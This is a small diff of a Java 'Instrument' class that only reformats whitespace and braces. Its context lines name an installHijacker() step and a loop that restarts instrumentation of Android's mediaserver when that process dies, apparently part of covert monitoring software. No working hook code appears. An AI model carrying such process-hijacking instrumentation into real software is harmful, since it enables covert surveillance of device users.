@@ -111,7 +111,7 @@ public class Instrument {
 		if (!installHijacker()) {
 			return false;
 		}
-		
+
 		try {
 			int pid = getProcessPid();
 
@@ -291,15 +291,15 @@ public class Instrument {
 						Check.log(TAG + "(MediaserverMonitor run): Mediaserver died, restarting instrumentation");
 					}
 
-					failedCounter  += 1;
-					if(failedCounter < 3) {
+					failedCounter += 1;
+					if (failedCounter < 3) {
 						startInstrumentation();
-					}else{
+					} else {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (run) too many retry, sto restart mediaserver");
 						}
 					}
-				}else{
+				} else {
 					failedCounter = 0;
 				}
 			}
